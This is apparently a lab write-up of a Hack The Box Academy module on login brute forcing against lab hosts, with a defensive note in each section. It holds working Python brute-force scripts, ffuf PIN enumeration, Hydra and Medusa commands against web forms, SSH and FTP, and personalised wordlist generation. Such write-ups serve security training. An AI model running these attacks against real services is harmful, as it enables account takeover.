| Field | Value |
|---|---|
| Author | NeroPQ — NERO.SEC |
| Platform | Hack The Box Academy |
| Module | Login Brute Forcing (Module 57) |
| Official URL | https://academy.hackthebox.com/app/module/57 |
| Difficulty | Not verified |
| Category | Web Application Security — Authentication Attacks / Brute Forcing |
| Report date | 2026-11-18 |
| Classification | Lab write-up (flags and passwords redacted in text; screenshots unredacted) |
| Publication status | Draft — not approved for publication |

> **Evidence-integrity note.** Every command, output and screenshot in this report comes from the author's own lab sessions on HTB Academy (Parrot OS PwnBox, two PwnBox spawns on `eu-academy-6`). Commands whose typed line was not captured are labelled **reconstructed**; results that were not captured are marked **EVIDENCE PENDING** and are not presented as verified. Flags, the brute-forced PIN and all recovered passwords are redacted; usernames are kept because they are part of the method. Lab target IPs and ports are ephemeral and replaced with `<TARGET_IP>` / `<PORT>` in prose. Screenshots are kept unredacted at the author's request, so they show flags and passwords in clear text.

## Contents

1. [Overview](#overview)
2. [Learning Objectives](#learning-objectives)
3. [Environment and Evidence Boundaries](#environment-and-evidence-boundaries)
4. [01. Introduction](#01-introduction)
5. [02. Password Security Fundamentals](#02-password-security-fundamentals)
6. [03. Brute Force Attacks](#03-brute-force-attacks)
7. [04. Dictionary Attacks](#04-dictionary-attacks)
8. [05. Hybrid Attacks](#05-hybrid-attacks)
9. [06. Hydra](#06-hydra)
10. [07. Basic HTTP Authentication](#07-basic-http-authentication)
11. [08. Login Forms](#08-login-forms)
12. [09. Medusa](#09-medusa)
13. [10. Web Services](#10-web-services)
14. [11. Custom Wordlists](#11-custom-wordlists)
15. [12. Skills Assessment — Part 1](#12-skills-assessment--part-1)
16. [13. Skills Assessment — Part 2](#13-skills-assessment--part-2)
17. [Troubleshooting](#troubleshooting)
18. [Results and Evidence](#results-and-evidence)
19. [Security Implications](#security-implications)
20. [Lessons Learned](#lessons-learned)
21. [References](#references)

## Overview

This module covers online password guessing against live services: exhausting a small keyspace (a 4-digit PIN), trying common passwords from a dictionary, combining dictionaries with policy filters, and building target-specific wordlists from personal information. It introduces two general-purpose tools, **Hydra** and **Medusa**, and applies them to HTTP Basic Authentication, HTML login forms, SSH and FTP. The two-part skills assessment chains these: brute-force a web login to learn an SSH username, brute-force SSH, then pivot to an FTP service that is only reachable from inside the host.

The report follows the module's section order. Theory-only sections (01, 02, 05, 06, 09) have no lab question and are documented as concepts and syntax. Each practical chapter gives the concept, the commands that were run, an interpretation of the output, and a defensive note.

## Learning Objectives

- Explain why keyspace size and password reuse decide whether brute forcing is feasible.
- Brute-force a numeric PIN and a password endpoint with a short Python script and with ffuf.
- Filter wordlists to match a known password policy (hybrid approach).
- Use Hydra against HTTP Basic Auth (`http-get`) and HTML forms (`http-post-form`) with a correct failure condition.
- Use Medusa against SSH and FTP, including a service bound to `127.0.0.1` reached after an SSH foothold.
- Generate target-specific usernames with `username-anarchy` and passwords with `cupp`.
- Chain web, SSH and FTP brute forcing in an unguided assessment.

## Environment and Evidence Boundaries

| Item | Detail |
|---|---|
| Attacker host | HTB Academy PwnBox (Parrot OS), Hydra v9.5, ffuf, Medusa, curl, Python 3 |
| Targets | Per-section HTB Academy lab instances (IP and port change per spawn) |
| Wordlists seen in evidence | SecLists `500-worst-passwords.txt`, `2023-200_most_used_passwords.txt`, `top-usernames-shortlist.txt` (17 names); on-target 197-entry password list (chapter 10) and `passwords.txt` (chapter 13); generated `jane.txt` / `jane-filtered.txt` / `jane_smith_usernames.txt` |
| Evidence available | 11 real screenshots plus pasted terminal text (Hydra login-form result, the 405 error, the bash history-expansion error) |
| Evidence missing | Hydra command/output for Basic HTTP Auth (07); SSH brute force for `sshuser` (10) and for the Part 2 user (13); `username-anarchy` runs; Medusa FTP output in Part 2; `IncidentReport.txt` contents; Part 1 username line on the flag page — see **EVIDENCE PENDING** markers |

> **Scope note.** All targets are HTB-provided lab hosts. No public or third-party system was tested.

## 01. Introduction

### Concept

Brute forcing is systematic guessing of credentials until one is accepted. Its success depends on three things: how large the search space is, how fast guesses can be tried, and whether the defender limits or detects attempts. The module's taxonomy:

| Method | Idea | Typical use |
|---|---|---|
| Simple brute force | Try every combination in a character set | Short PINs, short numeric codes |
| Dictionary attack | Try likely passwords from a list | Human-chosen passwords |
| Hybrid attack | Dictionary words plus mutations or policy filtering | Passwords built to satisfy complexity rules |
| Credential stuffing | Reuse username/password pairs leaked elsewhere | Accounts with reused passwords |
| Password spraying | One or few common passwords across many accounts | Avoiding per-account lockout |
| Rainbow tables | Precomputed hash-to-plaintext lookups | Offline, unsalted hashes |
| Reverse brute force | One known password against many usernames | Leaked password, unknown user |
| Distributed brute force | Spread attempts over many machines/IPs | Bypassing per-IP rate limits |

This module is about **online** attacks: each guess is a real request to a live service, so speed is bounded by the network and the service, and every guess can be logged.

### Defensive perspective

Online guessing is the easiest password attack to stop: rate limiting, lockout or progressive delays, MFA and alerting on failed-login bursts each remove most of its value.

## 02. Password Security Fundamentals

### Concept

The number of possible passwords is `charset_size ^ length`. Each extra character multiplies the space; a larger character set raises the base.

| Password type | Charset | Length | Combinations |
|---|---|---|---|
| 4-digit PIN | 10 | 4 | 10,000 |
| Lowercase only | 26 | 8 | ~2.1 × 10^11 |
| Upper + lower + digits | 62 | 8 | ~2.2 × 10^14 |
| Upper + lower + digits + symbols | ~94 | 12 | ~4.8 × 10^23 |

Length and randomness matter more than composition rules. A complex-looking password built from a name, a date and `!!` is still in a small, guessable space (chapter 11). The module also stresses:

- **Default credentials** (`admin:admin`, vendor defaults) are the first thing to try and the first thing to change.
- **Reuse** turns one breach into many compromised accounts.
- **Policies that force predictable patterns** (capital first, digit and symbol at the end) shrink the real search space.

### Defensive perspective

Prefer long passphrases or password-manager output, block known-breached and common passwords at registration, remove default accounts, and require MFA where possible.

## 03. Brute Force Attacks

### Concept

A 4-digit PIN has only 10,000 values, so it can be exhausted. The lab exposes `GET /pin?pin=XXXX` and returns JSON containing a `flag` field when the PIN is correct. The module provides a Python solver that loops `0000`–`9999`:

```python
import requests

ip = "<TARGET_IP>"
port = <PORT>

for pin in range(10000):
    formatted_pin = f"{pin:04d}"
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")
    if response.ok and 'flag' in response.json():
        print(f"Correct PIN found: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")
        break
```

### Commands (as run)

The PIN space was enumerated with ffuf instead of the Python loop. **Reconstructed** command (the typed ffuf line is not in the capture, only its progress output):

```bash
seq -w 0000 9999 > pins.txt
ffuf -w pins.txt -u "http://<TARGET_IP>:<PORT>/pin?pin=FUZZ" -mr "flag"
```

The found PIN was then confirmed with a single request (captured):

```bash
curl "http://<TARGET_IP>:<PORT>/pin?pin=<PIN>"
```

### Output and interpretation

ffuf completed **10000/10000** requests at about **123 req/s** in **1 min 22 s** with **0 errors**. The confirming request returned `{"flag":"HTB{…}","message":"Correct PIN!"}`.

![ffuf completing 10,000 PIN requests and curl confirming the PIN](/writeups/evidence/htb-login-brute-forcing/03-brute-force-attacks/pin-ffuf-curl.jpg "ffuf progress reaching 10000/10000 (0 errors), then curl with the correct PIN returning the flag and 'Correct PIN!'.")

**Result:** PIN found; flag obtained, redacted.

### Defensive perspective

10,000 guesses in under 90 seconds with no throttling. A PIN endpoint needs attempt limits per account and per client (for example lockout after a few failures), and must not return a different response shape that makes a hit trivially machine-detectable.

## 04. Dictionary Attacks

### Concept

Human passwords cluster around common words. Instead of the full keyspace, try the most frequently used passwords. The lab exposes `POST /dictionary` with a `password` field; the module's solver downloads SecLists `500-worst-passwords.txt` and tries each entry.

### Command (as run)

```python
import requests

ip = "<TARGET_IP>"
port = <PORT>

passwords = requests.get(
    "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt"
).text.splitlines()

for password in passwords:
    print(f"Attempted password: {password}")
    r = requests.post(f"http://{ip}:{port}/dictionary", data={"password": password})
    if r.ok and "flag" in r.json():
        print(f"[+] Correct password found: {password}")
        print(f"[+] Flag: {r.json()['flag']}")
        break
```

```bash
python3 dictionary-solver.py
```

### Output and interpretation

The script walked the list (`winner`, `samantha`, `house`, …, `tiger`, `doctor`) until it reached the accepted password and printed the flag. The accepted password is an ordinary dictionary word in the 500-worst list.

![Dictionary solver output ending with the correct password and flag](/writeups/evidence/htb-login-brute-forcing/04-dictionary-attacks/dictionary-solver.jpg "'Attempted password' lines followed by '[+] Correct password found' and '[+] Flag'.")

**Result:** password found; flag obtained, redacted.

### Defensive perspective

Reject passwords that appear in common-password and breached-password lists at the time they are set. The attack needed under 500 requests.

## 05. Hybrid Attacks

### Concept

Users under a complexity policy tend to take a word and bolt on a capital letter, digits and a symbol (`Summer2024!`). A hybrid attack starts from a large dictionary and keeps only the candidates that satisfy the target's known policy, which shrinks the list sharply without losing the realistic candidates.

The module's example filters `darkweb2017-top10000.txt` for a policy of: at least 8 characters, an uppercase letter, a lowercase letter and a digit.

```bash
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/darkweb2017-top10000.txt

grep -E '^.{8,}$' darkweb2017-top10000.txt > darkweb2017-minlength.txt
grep -E '[A-Z]' darkweb2017-minlength.txt > darkweb2017-uppercase.txt
grep -E '[a-z]' darkweb2017-uppercase.txt > darkweb2017-lowercase.txt
grep -E '[0-9]' darkweb2017-lowercase.txt > darkweb2017-number.txt
wc -l darkweb2017-number.txt
```

Each `grep -E` keeps lines matching one rule; chaining them is a logical AND.

> This section has no lab question. The same filtering technique was applied for real in chapter 11 (Figure 11.2).

### Defensive perspective

Composition rules do not create randomness; they create predictable shapes that an attacker can filter for. Length requirements and breached-password blocking are more effective than "one of each character class".

## 06. Hydra

### Concept

Hydra is a parallel online login cracker supporting many protocols through service modules. General syntax:

```bash
hydra [login_options] [password_options] [attack_options] [service_options] service://server
```

| Option | Meaning |
|---|---|
| `-l user` / `-L file` | Single username / username list |
| `-p pass` / `-P file` | Single password / password list |
| `-s port` | Non-default port |
| `-t n` | Parallel tasks (default 16) |
| `-f` | Stop after the first valid pair |
| `-V` | Show every attempt |
| `-x min:max:charset` | Generate passwords instead of a list |

Common modules: `ssh`, `ftp`, `rdp`, `smb`, `mysql`, `http-get` (Basic Auth), `http-post-form` (HTML forms).

For `http-post-form` the module argument has three colon-separated parts:

```text
"/path:body_with_^USER^_and_^PASS^:F=failure_string"
```

`^USER^` and `^PASS^` are replaced per attempt. `F=` marks a response as a **failure** if it contains the string; `S=` marks **success** instead. A wrong failure string makes every attempt look successful (false positives) or none (missed hit).

> This section has no lab question. Hydra was used for real in chapters 07, 08, 11 and 12.

### Defensive perspective

Hydra's default 16 parallel tasks produce bursts that are easy to detect in authentication logs if anyone is watching them.

## 07. Basic HTTP Authentication

### Concept

With HTTP Basic Authentication the server answers `401 Unauthorized` with `WWW-Authenticate: Basic`, and the client resends the request with `Authorization: Basic base64(user:pass)`. The credentials are only base64-encoded, not encrypted, and each request is an independent login attempt, which makes it well suited to Hydra's `http-get` module.

### Commands

**Reconstructed** (the Hydra run for this section was not captured):

```bash
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt <TARGET_IP> http-get / -s <PORT>
curl -u 'basic-auth-user:<PASS>' http://<TARGET_IP>:<PORT>/
```

> **EVIDENCE PENDING:** the Hydra command, its output and the recovered password were not captured.

### Output and interpretation

The authenticated page is a "Congratulations!" page with the flag in a `<span class="flag">` element.

![HTML of the authenticated page showing 'Congratulations!' and the flag](/writeups/evidence/htb-login-brute-forcing/07-basic-http-authentication/basic-auth-flag-page.jpg "Page body after authentication: Congratulations! and the flag span.")

> **Attribution note:** the screenshot does not show the command or target. It is attributed to this section by session order (first PwnBox spawn, after chapters 03–04). Whether the flag was accepted on submission was not captured.

**Result:** flag obtained, redacted; credential recovery **EVIDENCE PENDING**.

### Defensive perspective

Basic Auth must only be used over TLS, should sit behind rate limiting (the protocol itself has none), and is a poor fit for anything internet-facing without an additional factor.

## 08. Login Forms

### Concept

An HTML form posts fields to the server and the server answers with either an error page or a redirect to a logged-in page. Before attacking, read the form (`Ctrl+U` or `curl`) to get three facts: the action path, the field names, and the exact failure message.

From the captured page source of this target:

```html
<form method="POST">
  <input type="text" id="username" name="username">
  <input type="password" id="password" name="password">
  <input type="submit" value="Login">
</form>
```

The form posts to `/` (no `action` attribute) with fields `username` and `password`. The failure message is "Invalid credentials".

### Commands (as run)

```bash
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Usernames/top-usernames-shortlist.txt
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt

hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f <TARGET_IP> -s <PORT> http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

Captured Hydra result (terminal text, password redacted):

```text
[<PORT>][http-post-form] host: <TARGET_IP>   login: admin   password: [REDACTED]
[STATUS] attack finished for <TARGET_IP> (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```

Logging in took three attempts (see Troubleshooting):

```bash
# 1. Wrong: Basic Auth header against a form — returns the login page again
curl -u admin:<PASS> http://<TARGET_IP>:<PORT>/

# 2. Wrong: -X POST forces POST on the redirect target — 405 Method Not Allowed
curl -s -L -c cookies.txt -b cookies.txt -X POST -d "username=admin&password=<PASS>" http://<TARGET_IP>:<PORT>/

# 3. Correct: -d sends POST, -L follows the redirect with GET, cookies keep the session
curl -s -L -c cookies.txt -b cookies.txt -d "username=admin&password=<PASS>" http://<TARGET_IP>:<PORT>/ | grep -oE "HTB\{[^}]+\}"
```

![curl POST with cookie jar extracting the flag after the 405 error](/writeups/evidence/htb-login-brute-forcing/08-login-forms/login-form-curl-flag.jpg "The 405 page from attempt 2, then attempt 3 printing the flag.")

### Interpretation

The server answers a valid login with a redirect to a GET-only page and tracks the login in a session cookie. `curl -d` without `-X` sends the POST and then follows the 302 with GET, which is what a browser does.

**Result:** credentials `admin` / [redacted]; flag obtained, redacted.

### Defensive perspective

A distinct failure string is what made the form attackable at Hydra speed. Lockout or progressive delay per account and per source, CAPTCHA after a few failures, and MFA defeat this; a generic error message alone does not.

## 09. Medusa

### Concept

Medusa is a modular, parallel login brute-forcer comparable to Hydra. Syntax:

```bash
medusa [target_options] [credential_options] -M module [module_options]
```

| Option | Meaning |
|---|---|
| `-h host` / `-H file` | Single target / target list |
| `-n port` | Non-default port |
| `-u user` / `-U file` | Single username / username list |
| `-p pass` / `-P file` | Single password / password list |
| `-M module` | Service module (`ssh`, `ftp`, `http`, `rdp`, `mysql`, `web-form`, …) |
| `-m option` | Module-specific option |
| `-t n` | Parallel login attempts |
| `-f` / `-F` | Stop after first success on this host / on any host |
| `-e ns` | Also try empty password (`n`) and password = username (`s`) |

> This section has no lab question. Medusa was used for real in chapter 10.

### Defensive perspective

Medusa and Hydra generate the same log signature: many failed logins from one source in a short time. The detection rule does not depend on the tool.

## 10. Web Services

### Concept

This lab chains two services. SSH is exposed; FTP listens only on `127.0.0.1` inside the host. The attacker brute-forces SSH from outside, then runs a second brute force from inside the foothold against the local FTP service.

### Step 1 — SSH brute force (reconstructed)

```bash
medusa -h <TARGET_IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
ssh sshuser@<TARGET_IP> -p <PORT>
```

> **EVIDENCE PENDING:** the SSH brute-force output and the `sshuser` password were not captured. The successful login is verified indirectly: later screenshots show a shell prompt `sshuser@ng-…-loginbfservice-…`.

### Step 2 — Local enumeration (reconstructed)

```bash
netstat -tulpn | grep LISTEN
ls
```

> **EVIDENCE PENDING:** output not captured. That FTP listens locally is verified by the successful `localhost:21` connection below.

### Step 3 — FTP brute force from the foothold (as run)

```bash
medusa -h 127.0.0.1 -u ftpuser -P <ON_TARGET_PASSWORD_LIST> -M ftp -t 5
```

The on-target list held **197** passwords. Medusa reported success at attempt **16 of 197**:

```text
ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: ftpuser Password: [REDACTED] [SUCCESS]
```

### Step 4 — Retrieve the flag (as run)

```bash
ftp ftp://ftpuser:<PASS>@localhost
ftp> ls
ftp> get flag.txt
ftp> exit
cat flag.txt
```

![Medusa finding the ftpuser password and the FTP login](/writeups/evidence/htb-login-brute-forcing/10-web-services/medusa-ftp-found.jpg "Medusa ACCOUNT FOUND for ftpuser (16 of 197), then ftp connecting to [::1]:21 (vsFTPd 3.0.5).")

![FTP session downloading flag.txt and cat output](/writeups/evidence/htb-login-brute-forcing/10-web-services/ftp-get-flag.jpg "230 Login successful, flag.txt (35 bytes) downloaded, cat flag.txt as sshuser.")

**Results:** Q1 — `ftpuser` password recovered (redacted). Q2 — flag obtained, redacted.

### Defensive perspective

Binding FTP to localhost protected it from the internet but not from anyone who already had a shell. Internal services need their own strong credentials, and a weak SSH password was the single point that exposed everything behind it. Disable SSH password authentication in favour of keys.

## 11. Custom Wordlists

### Concept

Generic lists fail against passwords built from personal details. The module gives a profile of the target, Jane Smith (nickname Janey, birthdate 11 Dec 1990, partner Jim "Jimbo" born 12 Dec 1990, pet Spot, company AHI), and two tools:

- **username-anarchy** — generates username formats from a real name (`jane`, `jsmith`, `jane.smith`, `smithj`, …).
- **cupp** (Common User Passwords Profiler) — interactive generator that combines profile facts with leet substitutions, numbers and special characters.

The target's password policy: at least 6 characters, at least one uppercase, one lowercase, one digit and two special characters from `!@#$%^&*`.

### Step 1 — Usernames (reconstructed)

```bash
git clone https://github.com/urbanadventurer/username-anarchy.git
./username-anarchy/username-anarchy Jane Smith > jane_smith_usernames.txt
```

> **EVIDENCE PENDING:** the `username-anarchy` run was not captured. Hydra later reports `l:14`, so the file held 14 usernames.

### Step 2 — Passwords with cupp (as run)

```bash
sudo apt install cupp -y
cupp -i
```

Profile answers entered: Jane, Smith, Janey, 11121990, Jim, Jimbo, 12121990, (no child), Spot, AHI; special characters **Y**, random numbers **Y**, leet mode **Y**.

![cupp interactive session saving jane.txt with 42,194 words](/writeups/evidence/htb-login-brute-forcing/11-custom-wordlists/cupp-jane-txt.jpg "cupp prompts and 'Saving dictionary to jane.txt, counting 42194 words'.")

> **Observation:** at the keyword prompt the value entered was `Y` rather than a keyword list (the module suggests interests such as `hacker,blue`). The intended keywords were therefore not added, but the correct password was still in the generated list because it derives from profile fields, not keywords.

### Step 3 — Apply the password policy (as run)

```bash
grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
wc -l jane-filtered.txt
```

The filter reduced **42,194** candidates to **7,186** (83 % removed). The last `grep` requires two occurrences of a special character anywhere in the string.

### Step 4 — Hydra (as run)

```bash
hydra -L jane_smith_usernames.txt -P jane-filtered.txt <TARGET_IP> -s <PORT> -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
```

Hydra planned 100,604 attempts (14 × 7,186) and found a valid pair two seconds after starting: login **`jane`**, password redacted (a leet-styled name fragment followed by two `!`).

![Policy filter result, Hydra run and valid pair for jane](/writeups/evidence/htb-login-brute-forcing/11-custom-wordlists/filter-and-hydra-jane.jpg "wc -l = 7186; Hydra l:14/p:7186; login: jane password: ….")

Note that the failure condition was given without `F=`. Hydra treats a bare string in that position as a failure string, so this is equivalent to `F=Invalid credentials`.

### Step 5 — Log in (as run)

The password contains `!!`. Inside double quotes bash expands `!!` to the previous command (history expansion), which corrupted the first attempt (see Troubleshooting). Single quotes fixed it:

```bash
curl -s -L -c cookies.txt -b cookies.txt -d 'username=jane&password=<PASS>' http://<TARGET_IP>:<PORT>/ | grep -oE "HTB\{[^}]+\}"
```

![curl with single-quoted body printing the flag](/writeups/evidence/htb-login-brute-forcing/11-custom-wordlists/curl-single-quote-flag.jpg "The single-quoted request prints the flag.")

**Result:** credentials `jane` / [redacted]; flag obtained, redacted.

### Defensive perspective

The password satisfied a strict-looking policy (upper, lower, digit, two symbols) yet was built entirely from public personal facts. Policies cannot detect that; user education, password managers and breached/contextual-password checks (rejecting the user's own name, birthdate and company) can.

## 12. Skills Assessment — Part 1

The target is a web server protected by HTTP Basic Authentication. Q1 asks for the password; Q2 asks for the username revealed after login, which is needed for Part 2.

### Command (reconstructed line, captured output)

```bash
hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f <TARGET_IP> -s <PORT> http-get /
```

Hydra reported `3400 login tries (l:17/p:200)` with 16 tasks against `http-get://<TARGET_IP>:<PORT>/` and found a valid pair after **8 seconds**: login **`admin`**, password redacted.

### Login (as run)

```bash
curl -s -u 'admin:<PASS>' http://<TARGET_IP>:<PORT>/
```

![Hydra finding admin on http-get and curl returning the Flag page](/writeups/evidence/htb-login-brute-forcing/12-skills-assessment-part-1/hydra-basic-auth-admin.jpg "Hydra l:17/p:200, valid pair for admin, then curl -u returning a page titled 'Flag'.")

### Interpretation

**Q1:** password recovered for `admin` (redacted).

**Q2:** the username for Part 2 is **`satwossh`**.

> **Evidence note for Q2:** the captured screenshot is cut off before the page body, so the line naming the username is not visible. The value is verified indirectly: Part 2's shell prompt is `satwossh@ng-…-loginbfsatwo-…` (Figure 13.1), which is only possible after authenticating as that user.

### Defensive perspective

`admin` with a password from a top-200 list protected the page that disclosed the next account name. Default administrative usernames should be renamed or disabled, and information about other accounts should never be exposed on a page protected by a single weak factor.

## 13. Skills Assessment — Part 2

The target exposes SSH. The username `satwossh` comes from Part 1. Q1 asks for the FTP username found by brute forcing; Q2 asks for the contents of `flag.txt`.

### Step 1 — SSH brute force (reconstructed)

```bash
medusa -h <TARGET_IP> -n <PORT> -u satwossh -P 2023-200_most_used_passwords.txt -M ssh -t 3
ssh satwossh@<TARGET_IP> -p <PORT>
```

> **EVIDENCE PENDING:** the SSH brute-force output and password were not captured. A shell as `satwossh` is verified by the prompt in Figure 13.1.

### Step 2 — Enumerate the home directory (reconstructed)

```bash
ls -la
cat IncidentReport.txt
netstat -tulpn | grep LISTEN
```

The home directory provides `IncidentReport.txt`, a `passwords.txt` list and a copy of `username-anarchy`. The incident report names a person, Thomas Smith, as the lead for the FTP account.

> **EVIDENCE PENDING:** the `ls` output and the text of `IncidentReport.txt` were not captured. The name is supported indirectly by the FTP username `thomas` that succeeded in Step 4.

### Step 3 — Generate usernames and brute-force FTP (reconstructed)

```bash
./username-anarchy/username-anarchy Thomas Smith > thomas_usernames.txt
medusa -h 127.0.0.1 -U thomas_usernames.txt -P passwords.txt -M ftp -t 16
```

> **EVIDENCE PENDING:** Medusa's `ACCOUNT FOUND` line was not captured.

### Step 4 — Retrieve the flag (as run)

```bash
ftp ftp://thomas:'<PASS>'@localhost
ftp> ls
ftp> get flag.txt
ftp> exit
cat flag.txt
```

The password was single-quoted because it contains `!`.

![FTP login as thomas, flag.txt download and cat as satwossh](/writeups/evidence/htb-login-brute-forcing/13-skills-assessment-part-2/ftp-thomas-flag.jpg "ftp as thomas to [::1]:21 (vsFTPd 3.0.5), 230 Login successful, flag.txt (28 bytes) downloaded, cat flag.txt in a satwossh@…loginbfsatwo… shell.")

### Results

**Q1:** the FTP username is **`thomas`** (verified by the successful FTP login).

**Q2:** flag obtained, redacted.

### Defensive perspective

The full chain was: default admin name plus common password on the web page, a disclosed SSH username, a common SSH password, an internal incident report naming the FTP owner, a predictable username format, and a weak FTP password. Each link was a guessable credential or a leaked name. Breaking any one (strong unique passwords, key-only SSH, no personal names in shared files, MFA on the web login) would have stopped the attack.

## Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| `curl -u admin:<PASS>` on the form target returns the login page again (08) | `-u` sends a Basic Auth header; the target is an HTML form that expects POST fields | Send the fields with `-d "username=…&password=…"` |
| `405 Method Not Allowed` after logging in (08) | `-X POST` together with `-L` forces POST on the redirect target, which only accepts GET | Drop `-X POST`; `-d` alone sends POST and then follows the 302 with GET |
| A pasted `curl` turns into a long repeated command (11) | The password contains `!!`; in double quotes bash history expansion replaces `!!` with the previous command | Single-quote the body (`-d '…'`) or run `set +H` |
| cupp keyword prompt answered with `Y` (11) | The prompt asks for the words themselves after the Y/N question | Enter a comma-separated list (for example `hacker,blue`); the run still succeeded because the password came from profile fields |
| Hydra `http-post-form` reports many false positives (general) | Wrong failure string or wrong field names | Read the page source; copy the exact error text after `F=` and the exact `name=` attributes |

## Results and Evidence

| Chapter | Result | Verification |
|---|---|---|
| 01 Introduction | Attack taxonomy | Theory — no lab question |
| 02 Password Security Fundamentals | Keyspace and policy concepts | Theory — no lab question |
| 03 Brute Force Attacks | PIN found (10,000 requests, 0 errors); flag obtained | Verified — screenshot; PIN and flag redacted; ffuf command line reconstructed |
| 04 Dictionary Attacks | Password found in `500-worst-passwords`; flag obtained | Verified — screenshot; password and flag redacted |
| 05 Hybrid Attacks | Policy filtering technique | Theory — applied in chapter 11 |
| 06 Hydra | Syntax and modules | Theory — applied in 07, 08, 11, 12 |
| 07 Basic HTTP Authentication | Flag page reached; flag obtained | Flag page verified (screenshot, attributed by session order); Hydra run **EVIDENCE PENDING** |
| 08 Login Forms | `admin` / [redacted]; flag obtained | Verified — Hydra terminal text and screenshot |
| 09 Medusa | Syntax and modules | Theory — applied in 10 |
| 10 Web Services | Q1 `ftpuser` password found (16/197); Q2 flag obtained | FTP brute force and flag verified (screenshots); SSH brute force **EVIDENCE PENDING** |
| 11 Custom Wordlists | 42,194 → 7,186 candidates; `jane` / [redacted]; flag obtained | Verified — three screenshots; username-anarchy run **EVIDENCE PENDING** |
| 12 Skills Assessment Part 1 | Q1 `admin` / [redacted]; Q2 `satwossh` | Q1 verified (screenshot); Q2 verified indirectly via Part 2 shell prompt |
| 13 Skills Assessment Part 2 | Q1 `thomas`; Q2 flag obtained | FTP login and flag verified (screenshot); SSH brute force, incident report and Medusa FTP output **EVIDENCE PENDING** |

Evidence files (11 screenshots) belong under `public/writeups/evidence/htb-login-brute-forcing/<section>/`. The screenshots are unredacted and show flags and passwords; the report text itself does not repeat any flag, PIN or recovered password.

## Security Implications

- **Small keyspaces fall in minutes.** A 4-digit PIN was exhausted in 82 seconds with no throttling.
- **Common-password lists still work.** Three of the recovered passwords (chapters 04, 08, 12) came from public top-200/top-500 lists, and the `ftpuser` password was the 16th entry of a 197-entry common-password list.
- **Complexity rules are not entropy.** The custom-wordlist password met an upper/lower/digit/two-symbol policy and was still generated from public personal details.
- **One weak credential exposes the next.** In the assessment, a weak web login disclosed an SSH username, the SSH foothold exposed an internal FTP service, and an internal document named its owner.
- **Localhost-only is not access control.** FTP bound to `127.0.0.1` was reachable as soon as any local shell existed.
- **No lockout anywhere.** Every target accepted thousands of failed attempts without delay, lockout or CAPTCHA.

## Lessons Learned

1. Read the login mechanism before choosing the attack: `401 + WWW-Authenticate: Basic` means `http-get`; an HTML form means `http-post-form` with exact field names and failure text.
2. Reproduce the browser when logging in with `curl`: POST with `-d`, follow redirects with `-L`, keep cookies with `-c`/`-b`, and never combine `-X POST` with `-L`.
3. Quote passwords with single quotes in bash; `!` triggers history expansion inside double quotes.
4. Shrink the search space before attacking: a known policy cut the custom list by 83 %.
5. After a foothold, check for services bound to localhost and for documents that name people; both drove the final stage of the assessment.
6. Capture the brute-force output for every step, not just the final flag. Several chapters here lack the run that produced the credential, which weakens the evidence even where the result is correct.

## References

- Hack The Box Academy — Login Brute Forcing: https://academy.hackthebox.com/app/module/57
- THC Hydra: https://github.com/vanhauser-thc/thc-hydra
- Medusa: https://github.com/jmk-foofus/medusa
- username-anarchy: https://github.com/urbanadventurer/username-anarchy
- CUPP — Common User Passwords Profiler: https://github.com/Mebus/cupp
- SecLists (wordlists): https://github.com/danielmiessler/SecLists
